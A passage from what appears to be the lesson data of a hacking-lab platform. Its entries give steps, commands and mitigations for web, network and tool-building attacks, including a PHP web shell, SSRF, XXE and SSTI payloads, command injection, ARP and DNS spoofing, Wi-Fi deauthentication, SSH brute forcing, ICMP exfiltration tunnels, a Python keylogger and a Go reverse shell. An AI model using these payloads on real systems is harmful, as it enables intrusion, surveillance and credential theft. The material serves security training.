        category: "web-hacking",
        difficulty: "advanced",
        duration: "4-5 Hours",
        xp: 100,
        description: "Upload a malicious web shell by bypassing client-side extension filters, then run remote terminal console commands.",
        guide: {
            objective: "Upload a script (PHP/ASP) and execute system commands remotely in the server environment.",
            labSetup: "Web page offering file uploads (e.g., profile avatars) with weak validation checks.",
            steps: [
                "Create a simple PHP web shell file (e.g., shell.php) containing system execution logic.",
                "Attempt to upload it and note any file extension blocks.",
                "Bypass block mechanisms using extension manipulation (e.g., shell.php5, shell.phtml) or null-bytes.",
                "Intercept requests with Burp Suite to alter content-type headers to image/jpeg.",
                "Access the uploaded file directory via browser and input command queries (e.g., ?cmd=whoami)."
            ],
            commands: "Simple PHP Shell:\n<?php echo shell_exec($_GET['cmd']); ?>\n\nCommand execution trigger:\nhttp://target.local/uploads/shell.php?cmd=cat%20/etc/passwd",
            mitigation: "Store uploaded documents outside the webroot. Generate randomized file names, restrict executions, and use secure static server directories."
        }
    },
    {
        id: 6,
        title: "IDOR on User Profile API",
        category: "web-hacking",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Modify user ID parameters inside request payloads to view or update private details of other accounts.",
        guide: {
            objective: "Gain unauthorized access to user profile pages by altering numeric identifiers.",
            labSetup: "Web app dashboard loading settings from an API using queries like /api/v1/user/1001.",
            steps: [
                "Log into the application and locate the account profile page.",
                "Capture profile requests in Burp Suite and locate parameters containing ID digits.",
                "Manually increment or decrement the ID (e.g., changing 1001 to 1002).",
                "Verify if the server sends back data belonging to another user without checking authentication."
            ],
            commands: "IDOR Intercept:\nGET /api/v1/users/1002 HTTP/1.1\nHost: target.local\nAuthorization: Bearer [User_1001_Token]",
            mitigation: "Implement robust access control checks at the controller level. Use non-sequential UUIDs instead of predictable numeric IDs."
        }
    },
    {
        id: 7,
        title: "CSRF Password Reset Exploit",
        category: "web-hacking",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Forge an HTTP request that forces authenticated victim profiles to change credentials when visiting a malicious page.",
        guide: {
            objective: "Perform actions on behalf of another logged-in user without their knowledge or consent.",
            labSetup: "A password update panel that doesn't use anti-CSRF tokens or double-submit cookies.",
            steps: [
                "Locate the form for modifying passwords or email addresses.",
                "Capture form requests with Burp Suite and check for unique security tokens.",
                "Create a malicious HTML file with a self-submitting form targeting the update endpoint.",
                "Load the malicious file in a browser session where the target user is logged in, verifying if their password updates automatically."
            ],
            commands: "CSRF PoC Form:\n<form id='csrf' action='http://target.local/update' method='POST'>\n  <input type='hidden' name='password' value='hacked'>\n</form>\n<script>document.getElementById('csrf').submit();</script>",
            mitigation: "Add unique, cryptographically secure anti-CSRF tokens to all POST forms, or implement SameSite=Strict cookie properties."
        }
    },
    {
        id: 8,
        title: "SSRF on Cloud Metadata Endpoint",
        category: "web-hacking",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Abuse URL validation parameters to force backend servers to query internal metadata APIs and leak credentials.",
        guide: {
            objective: "Read internal server APIs or AWS metadata structures by exploiting import/fetching parameters.",
            labSetup: "A PDF generator or URL fetch form that downloads files from user-defined addresses.",
            steps: [
                "Find fields asking for URL parameters (e.g. ?url=http://example.com/logo.png).",
                "Change the parameter address to target local host services: http://localhost:80/ or http://127.0.0.1/.",
                "Query cloud provider metadata endpoints, specifically: http://169.254.169.254/latest/meta-data/.",
                "Extract IAM credentials, keys, and security groups from the HTTP response structure."
            ],
            commands: "SSRF AWS Query:\n?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n?url=http://127.0.0.1:8080/admin",
            mitigation: "Validate and whitelist destination domains. Avoid fetching direct client URL parameters; place internal APIs on separate isolated network segments."
        }
    },
    {
        id: 9,
        title: "XML External Entity (XXE) Injection",
        category: "web-hacking",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Inject custom XML entity definitions into input fields to load file contents or ping external target ports.",
        guide: {
            objective: "Retrieve system configurations and exploit file processing using malicious XML payloads.",
            labSetup: "An API endpoint accepting XML format inputs (e.g., SOAP service, content uploads) without checking external system variables.",
            steps: [
                "Capture an API post containing XML structures in its payload body.",
                "Insert a custom DOCTYPE definition containing an external entity mapping to a local system file.",
                "Reference the defined entity in the XML data payload tag.",
                "Verify if system files (e.g. /etc/passwd) are printed back inside API responses."
            ],
            commands: "XXE Payload:\n<?xml version=\"1.0\"?>\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<user><username>&xxe;</username><password>pass</password></user>",
            mitigation: "Disable External Entity Resolution (DTD/external entities processing) in the XML parser configuration settings."
        }
    },
    {
        id: 10,
        title: "Directory Traversal Vulnerability Lab",
        category: "web-hacking",
        difficulty: "beginner",
        duration: "1-2 Hours",
        xp: 50,
        description: "Browse files and directories outside webroot spaces using path manipulation tricks.",
        guide: {
            objective: "Access folders containing source code or credentials using relative page pathing links.",
            labSetup: "A static file delivery page using query parameters, like /download.php?file=report.pdf.",
            steps: [
                "Inspect file download parameters in URL query links.",
                "Insert directory delimiters to back out of directory nodes: download.php?file=../../etc/passwd.",
                "Verify if the server allows reading system documents, bypass filters with URL-encoding (%2e%2e%2f)."
            ],
            commands: "Path Traversal variants:\n?file=....//....//etc/passwd\n?file=%252e%252e%252fetc/passwd",
            mitigation: "Use strict whitelists of files. Strip path traversal symbols dynamically, or map parameters to database indexes."
        }
    },
    {
        id: 11,
        title: "Broken Authentication & Session Hack",
        category: "web-hacking",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Hijack authentication sessions by exploiting weak cookies, predictable session tokens, or session fixation bugs.",
        guide: {
            objective: "Take control of an active user session using leaked or stolen cookie strings.",
            labSetup: "A application utilizing weak session IDs (e.g. base64-encoded usernames) or lacking session regeneration on login.",
            steps: [
                "Analyze the session cookies stored in the browser (e.g., SessionID=YWRtaW4=).",
                "Decode session strings to detect patterns, like Base64 or MD5 mappings.",
                "Forge custom session cookies for other user accounts (e.g., encoding 'admin' to replace 'guest').",
                "Verify dashboard entry with modified cookies without inputting account passwords."
            ],
            commands: "Decoding session strings:\necho -n 'YWRtaW4=' | base64 --decode\n# output: admin",
            mitigation: "Use secure, cryptographically random, high-entropy session IDs generated by framework engines on every authorization."
        }
    },
    {
        id: 12,
        title: "Clickjacking Attack Site",
        category: "web-hacking",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Build an invisible iframe overlap page that tricks victims into clicking high-privilege operations.",
        guide: {
            objective: "Force target users to perform unintended actions by overlaying transparent target page containers.",
            labSetup: "A web page performing high-privilege clicks (e.g., delete profile button) lacking iframe display security parameters.",
            steps: [
                "Create a malicious HTML page with an iframe loading the target site.",
                "Style the iframe with absolute positioning and opacity: 0 to make it completely invisible.",
                "Position a decoy element (e.g. 'Click here for free reward' button) directly underneath the target button.",
                "Test if clicking the decoy triggers action processing in the hidden iframe."
            ],
            commands: "Clickjacking CSS:\niframe {\n  position: absolute; width: 500px; height: 500px;\n  opacity: 0; z-index: 2;\n}\nbutton.decoy {\n  position: absolute; z-index: 1;\n}",
            mitigation: "Send X-Frame-Options: DENY headers or implement robust Content Security Policy (CSP) frame-ancestors definitions."
        }
    },
    {
        id: 13,
        title: "Command Injection via Ping Form",
        category: "web-hacking",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Inject shell execution command separators (e.g. ;, &&) into a network utility tool to run arbitrary OS terminal functions.",
        guide: {
            objective: "Execute arbitrary operating system commands on the hosting server.",
            labSetup: "A web utility page that runs a ping check on an IP address provided in a form input field.",
            steps: [
                "Find inputs that execute shell utilities under the hood (e.g., ping tool).",
                "Input a valid IP followed by command separators: 127.0.0.1; whoami.",
                "Verify if system command execution output is appended to ping response details.",
                "Test other delimiters if shell blocks exist (e.g., |, &, ||, newlines)."
            ],
            commands: "Command Injection Payloads:\n127.0.0.1; cat /etc/passwd\n127.0.0.1 && id\n127.0.0.1 | uname -a",
            mitigation: "Avoid direct command shell execution. Execute APIs using structured system frameworks or sanitize parameter inputs."
        }
    },
    {
        id: 14,
        title: "SSTI in Python Web App",
        category: "web-hacking",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Exploit server-side template rendering scripts (Jinja2/Mako) to access application contexts and execute commands.",
        guide: {
            objective: "Gain Remote Code Execution by injecting system directives into HTML template fields.",
            labSetup: "A Python Flask web app rendering data using string formatting instead of structured templates.",
            steps: [
                "Locate query fields reflecting user input (e.g., error display messages).",
                "Input dynamic calculation syntax to test parsing: {{7*7}}.",
                "Verify output displays 49, indicating active server-side template processing.",
                "Inject class-navigation variables to access Python subclasses and trigger remote shell commands."
            ],
            commands: "Jinja2 SSTI payloads:\n{{7*7}}\n{{self._TemplateReference__context.namespace}}\n{{''.__class__.__mro__[1].__subclasses__()[117]('whoami',shell=True).check_output()}}",
            mitigation: "Never concatenate strings into template definitions. Render parameters using standard templating mechanisms with sandbox validation."
        }
    },
    {
        id: 15,
        title: "JWT Token Authentication Bypass",
        category: "web-hacking",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Modify JSON Web Tokens (JWT) using the 'None' algorithm or brute-forced signature keys to hijack session authentication.",
        guide: {
            objective: "Gain administrative session rights by tampering with JWT headers and payloads.",
            labSetup: "A login API authenticating sessions using JWT parameters in headers without key validations.",
            steps: [
                "Locate JWT tokens in browser headers or storage.",
                "Decode headers in a tool and set the signing algorithm 'alg' parameter to 'None'.",
                "Modify user role values in payload sections to 'admin'.",
                "Re-encode JWT without appending signature strings and send authentication requests."
            ],
            commands: "JWT Header alteration:\n{\n  \"alg\": \"None\",\n  \"typ\": \"JWT\"\n}\n\nJWT Payload alteration:\n{\n  \"username\": \"admin\",\n  \"role\": \"admin\"\n}",
            mitigation: "Always validate signature keys. Set strong secrets, and reject token strings stating 'alg':'None' inside authorization headers."
        }
    },
    {
        id: 16,
        title: "CORS Misconfiguration Audit",
        category: "web-hacking",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Audit headers to detect wildcard Access-Control-Allow-Origin configs, allowing external domains to read responses.",
        guide: {
            objective: "Extract user data from APIs by hosting a script that exploits open CORS headers.",
            labSetup: "An API dashboard returning user stats with Access-Control-Allow-Origin set dynamically based on Origin request headers.",
            steps: [
                "Send API requests with modified Origin headers: Origin: http://malicious.local.",
                "Inspect responses for Access-Control-Allow-Origin: http://malicious.local.",
                "Check for presence of Access-Control-Allow-Credentials: true.",
                "Create a payload script that queries the endpoint and logs responses to confirm data access."
            ],
            commands: "CORS Audit Request Header:\nGET /api/v1/user HTTP/1.1\nOrigin: http://evil.com\nAccess-Control-Request-Method: GET",
            mitigation: "Avoid implementing wildcard dynamically echoed origin setups. Explicitly map trusted client domains inside CORS configurations."
        }
    },
    {
        id: 17,
        title: "GraphQL Query Abuse Lab",
        category: "web-hacking",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Exploit unprotected GraphQL endpoints using circular nested queries to cause Server Denial of Service (DoS).",
        guide: {
            objective: "Exhaust API backend systems by injecting deep circular queries.",
            labSetup: "An active GraphQL endpoint containing self-referencing relationship schemes.",
            steps: [
                "Locate the GraphQL interface (e.g. /graphql, /graphiql).",
                "Run introspection queries to map existing schema relationships.",
                "Construct circular self-referencing scripts mapping queries (e.g. author -> posts -> author -> posts).",
                "Execute the deep query and monitor API loading times to verify service degradation."
            ],
            commands: "Circular GraphQL payload:\nquery DoS {\n  author {\n    posts {\n      author {\n        posts { id }\n      }\n    }\n  }\n}",
            mitigation: "Disable schema introspection in production environments. Implement query depth-limiting and query cost validation."
        }
    },

    // Network Security (18-34)
    {
        id: 18,
        title: "Packet Sniffing with Wireshark",
        category: "network-sec",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Capture and analyze unencrypted cleartext passwords, email details, and protocols from active network adapters.",
        guide: {
            objective: "Monitor network adapters and extract credentials from unencrypted protocol packets.",
            labSetup: "Install Wireshark locally and set up a basic target client sending HTTP/FTP requests.",
            steps: [
                "Start Wireshark and select your primary active network interface card.",
                "Click the capture button and filter packets by protocol: http.",
                "Generate some test traffic by accessing an unencrypted login form on a HTTP website.",
                "Stop the capture and use 'Follow HTTP Stream' to view submitted username and password strings."
            ],
            commands: "Wireshark Display Filters:\nhttp\nhttp.request.method === \"POST\"\nftp || telnet",
            mitigation: "Enforce TLS/SSL encryption globally. Deprecate legacy cleartext protocols (HTTP, FTP, Telnet) in favor of HTTPS, SFTP, and SSH."
        }
    },
    {
        id: 19,
        title: "ARP Spoofing Hacking Demo",
        category: "network-sec",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Perform a Man-in-the-Middle (MitM) attack by poisoning ARP tables to intercept traffic between local clients.",
        guide: {
            objective: "Redirect traffic from a target host through your machine using forged ARP packets.",
            labSetup: "An isolated subnet with three systems (Victim client, Target Gateway, Attacker machine).",
            steps: [
                "Turn on IP forwarding on the attacker machine to prevent network disruptions.",
                "Identify client and gateway IP addresses using network sweeps.",
                "Run arpspoof to poison target system ARP tables, masquerading as the router.",
                "Run arpspoof targeting the router, masquerading as the victim, and inspect the incoming packet flows."
            ],
            commands: "Enable IP Forwarding:\nsudo sysctl -w net.ipv4.ip_forward=1\n\nPoison Target Client:\nsudo arpspoof -i eth0 -t [Victim_IP] [Gateway_IP]\nsudo arpspoof -i eth0 -t [Gateway_IP] [Victim_IP]",
            mitigation: "Implement static ARP tables on high-value systems, enforce dynamic ARP inspection (DAI) on switches, and encrypt all application layer traffic."
        }
    },
    {
        id: 20,
        title: "DNS Spoofing with Ettercap",
        category: "network-sec",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Redirect web traffic requests from domain names to malicious attacker-controlled IP addresses on the local network.",
        guide: {
            objective: "Hijack network queries and resolve standard host domains to local mock-up servers.",
            labSetup: "Install Ettercap on Kali Linux and prepare a mock web server on the local subnet.",
            steps: [
                "Configure Ettercap's plugin file (etter.dns) mapping target domains to your mock server IP.",
                "Select targets (Gateway and Victim Client) in Ettercap.",
                "Launch ARP poison spoofing to place your system in-path.",
                "Activate the dns_spoof plugin and check if visiting target sites redirects the client to your server."
            ],
            commands: "Ettercap launch GUI:\nsudo ettercap -G\n\nEttercap CLI trigger:\nsudo ettercap -T -q -P dns_spoof -M arp /[Victim_IP]/ /[Gateway_IP]/",
            mitigation: "Use encrypted DNS services (DNS over HTTPS/TLS) and DNSSEC. Configure firewalls to block rogue DNS responses."
        }
    },
    {
        id: 21,
        title: "Rogue DHCP Server Setup",
        category: "network-sec",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Deploy a rogue DHCP server that leases custom gateway and DNS settings to local network clients.",
        guide: {
            objective: "Deploy an attacker-controlled DHCP lease engine to capture data flows.",
            labSetup: "An isolated network space containing test client targets requesting IP parameters.",
            steps: [
                "Configure a local DHCP service setup (e.g. dnsmasq) stating gateway and DNS parameters matching your host IP.",
                "Initiate DHCP starvation checks to consume active server IP leases.",
                "Launch the rogue DHCP service on your local network port.",
                "Inspect system parameters of connecting clients to verify configuration takeovers."
            ],
            commands: "dnsmasq Rogue configuration:\ninterface=eth0\ndhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h\ndhcp-option=option:router,[Attacker_IP]\ndhcp-option=option:dns-server,[Attacker_IP]",
            mitigation: "Implement DHCP Snooping on local network switches. Disable rogue ports and check configuration mappings."
        }
    },
    {
        id: 22,
        title: "Nmap Port Scanning",
        category: "network-sec",
        difficulty: "beginner",
        duration: "1-2 Hours",
        xp: 50,
        description: "Scan network targets to discover active services, open ports, firewall parameters, and operating system information.",
        guide: {
            objective: "Perform reconnaissance on system targets using Nmap scans.",
            labSetup: "Host targets locally (e.g. Metasploitable VM) or use allowed network sandboxes.",
            steps: [
                "Scan targets using basic ping sweep configurations to find active systems.",
                "Initiate target checks using standard TCP SYN scans (-sS).",
                "Activate version tracking and OS detection tools (-A).",
                "Inspect scan outputs to map potential service exploits."
            ],
            commands: "Network sweep scan:\nnmap -sn 192.168.1.0/24\n\nFull aggressive vulnerability port check:\nnmap -sS -sV -O -A [Target_IP]\n\nScript scan for vulnerabilities:\nnmap --script vuln [Target_IP]",
            mitigation: "Disable unnecessary ports and services. Deploy firewalls, block ping checks, and use intrusion detection systems (IDS)."
        }
    },
    {
        id: 23,
        title: "Firewall Evasion Mechanics",
        category: "network-sec",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Use packet fragmentation, decoy IPs, and source port manipulation to bypass target security firewalls.",
        guide: {
            objective: "Complete reconnaissance scans bypassing local firewall detection rules.",
            labSetup: "A network target protected by basic system firewalls blocking standard Nmap scans.",
            steps: [
                "Scan the firewall target using port checks and verify if packets are dropped.",
                "Execute scans using Nmap fragmentation properties (-f) to split up packet headers.",
                "Test scanning using spoofed source ports commonly allowed by firewalls (e.g., port 53 or 80).",
                "Apply decoy scanning IP parameters (-D) to mask search origins."
            ],
            commands: "Scan with fragmented packets:\nnmap -f [Target_IP]\n\nDecoy scanning with specific source port:\nnmap -g 53 -D RND,RND,[Attacker_IP] [Target_IP]",
            mitigation: "Implement stateful inspection firewalls, deploy deep packet analysis, and block unknown source ports."
        }
    },
    {
        id: 24,
        title: "Wi-Fi Deauthentication Attack",
        category: "network-sec",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Force wireless clients to disconnect from access points by injecting spoofed deauth management frames.",
        guide: {
            objective: "Disconnect wireless devices from a network target by sending fake deauth packets.",
            labSetup: "An open/WPA2 wireless network, a client device, and an external network card supporting monitor mode.",
            steps: [
                "Place your wireless network card adapter into monitor mode.",
                "Execute airodump-ng sweeps to find targets, channels, and client MACs.",
                "Target a specific wireless router access point and monitor connected clients.",
                "Send deauth packets using aireplay-ng targeting the victim MAC, verifying they disconnect."
            ],
            commands: "Enable Monitor Mode:\nsudo airmon-ng start wlan0\n\nCapture packet details:\nsudo airodump-ng -c [channel] --bssid [Router_MAC] wlan0mon\n\nSend Deauth Frames:\nsudo aireplay-ng --deauth 10 -a [Router_MAC] -c [Victim_MAC] wlan0mon",
            mitigation: "Implement Protected Management Frames (PMF, 802.11w) on the router access point to prevent spoofing."
        }
    },
    {
        id: 25,
        title: "Evil Twin Access Point Lab",
        category: "network-sec",
        difficulty: "advanced",
        duration: "5 Hours",
        xp: 100,
        description: "Create a rogue wireless access point with identical SSID configurations to lure clients into connecting and leak data.",
        guide: {
            objective: "Deploy a duplicate wireless SSID network and capture client credentials via captive portals.",
            labSetup: "A system with internet capabilities, a monitor mode Wi-Fi adapter, and mock targets.",
            steps: [
                "Launch a duplicate SSID wireless network using utilities like hostapd or airgeddon.",
                "Deploy a DHCP IP assignment server on the interface to manage clients.",
                "Host a captive login page that redirects HTTP requests to grab inputs.",
                "Verify connecting victim clients input passwords into the web forms."
            ],
            commands: "Create AP with airgeddon GUI:\nsudo airgeddon\n\nDNSMASQ Config file mapping IP routing:\ninterface=at0\ndhcp-range=192.168.2.10,192.168.2.100,255.255.255.0,1h",
            mitigation: "Train users to avoid untrusted public Wi-Fi networks. Enable WPA3 protocols and utilize corporate VPN services."
        }
    },
    {
        id: 26,
        title: "SSH Brute-Forcing using Hydra",
        category: "network-sec",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Conduct automated dictionary attacks to find active user credentials on SSH servers.",
        guide: {
            objective: "Audit credential configurations on an SSH port using wordlists.",
            labSetup: "A test server running SSH and a target user account with a weak password.",
            steps: [
                "Identify target system IP and confirm SSH port 22 is open.",
                "Select password dictionaries (e.g. Rockyou text list) and username files.",
                "Configure Hydra with target threads, host details, and input files.",
                "Execute calculations and check for successful login matches."
            ],
            commands: "Hydra SSH attack syntax:\nhydra -l root -P /usr/share/wordlists/rockyou.txt ssh://[Target_IP] -t 4",
            mitigation: "Disable password logins for SSH; use secure key file mappings instead. Install Fail2ban to block IP ranges after repeated failed attempts."
        }
    },
    {
        id: 27,
        title: "FTP Interception via tcpdump",
        category: "network-sec",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Capture packet streams on the terminal using tcpdump to extract FTP login details.",
        guide: {
            objective: "Filter raw interface packet streams to capture plain-text user logins.",
            labSetup: "A client system logging into an unencrypted FTP server on the local subnet.",
            steps: [
                "Identify active interfaces on the attacker computer.",
                "Run tcpdump with port 21 filtering logic to inspect port traffic.",
                "Extract packet payloads on the console as raw text strings.",
                "Filter captures specifically for USER and PASS parameters to reveal credentials."
            ],
            commands: "Terminal packet grab:\nsudo tcpdump -i eth0 -A port 21 | grep -E -i 'USER|PASS'",
            mitigation: "Decommission unencrypted FTP connections. Transition to secure file protocols (SFTP / FTPS)."
        }
    },
    {
        id: 28,
        title: "Network Pivoting",
        category: "network-sec",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Pivot through compromised systems using SSH tunneling and proxychains to scan internal network nodes.",
        guide: {
            objective: "Tunnel network traffic through a compromised boundary system to scan hidden internal devices.",
            labSetup: "A boundary host connected to two networks: outer internet and internal local subnet.",
            steps: [
                "Establish a dynamic SSH tunnel port to the compromised boundary server.",
                "Configure proxychains (/etc/proxychains.conf) targeting local socks proxy configurations.",
                "Pre-load network commands with proxychains directives (e.g. proxychains nmap).",
                "Verify internal subnet scans execute successfully through the remote tunnel gateway."
            ],
            commands: "Open Dynamic Tunnel:\nssh -N -D 9050 user@[Compromised_IP]\n\nScan through dynamic proxy:\nproxychains nmap -sT -pn [Internal_Subnet_Target]",
            mitigation: "Implement strict network segmentation, enforce endpoint firewalls, and monitor logs for unusual internal connection flows."
        }
    },
    {
        id: 29,
        title: "VPN Tunnel Auditing",
        category: "network-sec",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Audit target VPN portals using ipsec-scan to find active encryption policies and weak handshake formats.",
        guide: {
            objective: "Identify security parameters and weak keys used in IPSec VPN servers.",
            labSetup: "A network endpoint running standard VPN configurations (IPSec/IKEv2).",
            steps: [
                "Run ike-scan to discover open VPN gateways on host ranges.",
                "Examine responses for active encryption profiles and transform payloads.",
                "Test system key handshakes using dictionary lists to uncover weak keys."
            ],
            commands: "VPN Scan with IKE-scan:\nsudo ike-scan -A [Target_IP]\n\nBrute force pre-shared keys:\nikeprobe -s [Target_IP]",
            mitigation: "Disable insecure aggressive negotiation modes in IPSec configurations. Enforce multi-factor authentication (MFA) and strong pre-shared keys."
        }
    },
    {
        id: 30,
        title: "SNMP Trap Vulnerability Scan",
        category: "network-sec",
        difficulty: "intermediate",
        duration: "2-3 Hours",
        xp: 75,
        description: "Scan port 161 with community wordlists to query system logs and network configuration details.",
        guide: {
            objective: "Extract sensitive system variables using SNMP queries with weak community strings.",
            labSetup: "A target device hosting active SNMP services with public/private default access configuration keys.",
            steps: [
                "Identify SNMP ports on target hosts.",
                "Execute Nmap script checks or use onesixtyone to discover active SNMP community keys.",
                "Query target devices using snmpwalk to extract system profiles, adapter details, and routing paths."
            ],
            commands: "SNMP Key discovery scan:\nonesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt [Target_IP]\n\nSNMP Walk Query:\nsnmpwalk -v 2c -c public [Target_IP]",
            mitigation: "Disable SNMP versions 1 and 2c. Enforce SNMPv3 which provides encryption and strong user authentication."
        }
    },
    {
        id: 31,
        title: "SSL Stripping Attack",
        category: "network-sec",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Force user browsers to downgrade from HTTPS to unencrypted HTTP using sslstrip during a MitM session.",
        guide: {
            objective: "Capture HTTPS traffic by stripping SSL/TLS layers between users and destinations.",
            labSetup: "An isolated network subnet with a proxy, victim client, and destination gateway.",
            steps: [
                "Initiate ARP spoofing attacks to intercept victim traffic.",
                "Configure iptables to redirect HTTP traffic (port 80) to your sslstrip listening port.",
                "Launch sslstrip to downgrade HTTPS requests on-the-fly.",
                "Monitor raw log files to extract plain-text user login credentials."
            ],
            commands: "Route Port Forwarding:\nsudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000\n\nLaunch SSLStrip:\nsslstrip -l 10000",
            mitigation: "Deploy HTTP Strict Transport Security (HSTS) headers globally on web servers. Implement HSTS preloading."
        }
    },
    {
        id: 32,
        title: "MAC Spoofing & Port Security Bypass",
        category: "network-sec",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Bypass switch port security rules by spoofing the MAC address of an authorized network device.",
        guide: {
            objective: "Connect an unauthorized system to a network secured by MAC-address-filtering.",
            labSetup: "A network switch configured with static MAC filtering on client connections.",
            steps: [
                "Inspect the MAC address of an active, authorized network computer.",
                "Temporarily disconnect the target device from the subnet.",
                "Modify your system's network card MAC address using macchanger to match the target device.",
                "Connect your computer to the switch port and verify connection access."
            ],
            commands: "Change MAC Address:\nsudo ip link set dev eth0 down\nsudo macchanger -m [Authorized_MAC] eth0\nsudo ip link set dev eth0 up",
            mitigation: "Deploy 802.1X network access control instead of relying on weak MAC filtering filters."
        }
    },
    {
        id: 33,
        title: "ICMP Tunneling for Data Exfil",
        category: "network-sec",
        difficulty: "advanced",
        duration: "4-5 Hours",
        xp: 100,
        description: "Exfiltrate data outside target network segments by tunneling traffic inside ICMP echo request packets.",
        guide: {
            objective: "Bypass firewall egress filters by routing commands inside standard ping request wrappers.",
            labSetup: "Two computers: an internal client (blocked from web ports) and an external server accepting ping checks.",
            steps: [
                "Deploy an ICMP tunnel host utility (e.g. ptunnel) on the external target server.",
                "Run the ptunnel client application on the internal compromised machine.",
                "Forward traffic (e.g., SSH sessions) through the established ICMP ping tunnel.",
                "Verify remote terminal command access bypassing TCP/UDP blocks."
            ],
            commands: "Launch Tunnel Server:\nsudo ptunnel -c [Interface]\n\nClient Connection Tunnel:\nsudo ptunnel -p [Server_IP] -lp 8000 -da 127.0.0.1 -dp 22",
            mitigation: "Block or limit outbound ICMP payload sizes. Monitor networks to detect large numbers of ping packets with non-standard payloads."
        }
    },
    {
        id: 34,
        title: "VLAN Hopping Attack",
        category: "network-sec",
        difficulty: "advanced",
        duration: "5 Hours",
        xp: 100,
        description: "Bypass switch isolation boundaries and access other subnet segments using double 802.1Q tagging attacks.",
        guide: {
            objective: "Force switches to forward frames to isolated target VLANs using dual tag frames.",
            labSetup: "A switch utilizing trunking protocols (DTP) with target VLAN subnets.",
            steps: [
                "Establish switch trunk relationships using dynamic trunking protocols (DTP).",
                "Construct network packets using double-tagging configurations (matching native and target VLAN IDs).",
                "Inject packets using yersinia or Scapy.",
                "Verify egress traffic flows reach the target VLAN systems."
            ],
            commands: "Yersinia GUI launch:\nsudo yersinia -G\n\nScapy Double Tag payload snippet:\npkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=10)/IP(dst='10.10.10.5')/ICMP()",
            mitigation: "Disable dynamic trunking (DTP) on ports. Avoid using default Native VLAN 1, and configure all unused switch ports as access ports."
        }
    },

    // Tool Development (35-51)
    {
        id: 35,
        title: "Python TCP Port Scanner",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "2-3 Hours",
        xp: 50,
        description: "Write a light, multi-threaded script in Python that probes target hosts for open ports and banners.",
        guide: {
            objective: "Build a socket port scanner in Python supporting multi-threaded targets.",
            labSetup: "Python installed locally; target ports hosting active network services.",
            steps: [
                "Create a Python script importing socket and threading modules.",
                "Define connection sockets targeting specific IP and port combinations.",
                "Implement try/except checks to verify successful handshakes (socket.connect()).",
                "Add multi-threading loops to scan ranges of ports simultaneously."
            ],
            commands: "Python Socket connection code:\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.settimeout(1.0)\nresult = s.connect_ex(('127.0.0.1', 80))\nif result === 0:\n    print('Port 80 is open!')\ns.close()",
            mitigation: "Secure code auditing: use strong timeouts, handle thread exceptions, and close active socket connections cleanly."
        }
    },
    {
        id: 36,
        title: "Python Keylogger",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "3 Hours",
        xp: 50,
        description: "Build a script that hooks OS keyboard event loops, records inputs, and dumps logs locally.",
        guide: {
            objective: "Create an offline input logger utility using Python libraries.",
            labSetup: "Python installed on a local target machine with keyboard access permissions.",
            steps: [
                "Install keyboard hook packages (e.g. pynput) using pip.",
                "Write listener event callbacks that trigger on key press inputs.",
                "Format logs to readable text strings including system spaces.",
                "Write outputs to hidden background local log text documents."
            ],
            commands: "Pynput setup command:\npip install pynput\n\nListener code block:\nfrom pynput.keyboard import Key, Listener\ndef on_press(key):\n    with open('log.txt', 'a') as f: f.write(str(key) + '\\n')\nwith Listener(on_press=on_press) as l: l.join()",
            mitigation: "Strict user permissions. Deploy host monitoring systems, and block unauthorized software scripts from reading OS APIs."
        }
    },
    {
        id: 37,
        title: "Simple Reverse Shell in Go",
        category: "tool-dev",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Develop a lightweight Go executable that initiates reverse TCP links and routes shell consoles.",
        guide: {
            objective: "Compile a cross-platform command-and-control connection tool in Go.",
            labSetup: "Go compiler installed on your system; netcat listener open on the receiver port.",
            steps: [
                "Write a Go application utilizing net and os/exec libraries.",
                "Create TCP connections targeting the listener IP and port.",
                "Execute system shell instances (cmd.exe or /bin/sh).",
                "Redirect standard inputs, outputs, and errors from shell streams directly to net socket connections."
            ],
            commands: "Go Shell Connection Code:\nconn, _ := net.Dial(\"tcp\", \"127.0.0.1:4444\")\ncmd := exec.Command(\"/bin/sh\")\ncmd.Stdin = conn\ncmd.Stdout = conn\ncmd.Stderr = conn\ncmd.Run()",
            mitigation: "Monitor system executions starting from unusual network interfaces. Use endpoint detection agents (EDR)."
        }
    },
    {
        id: 38,
        title: "Web Directory Crawler in Python",
        category: "tool-dev",
        difficulty: "beginner",
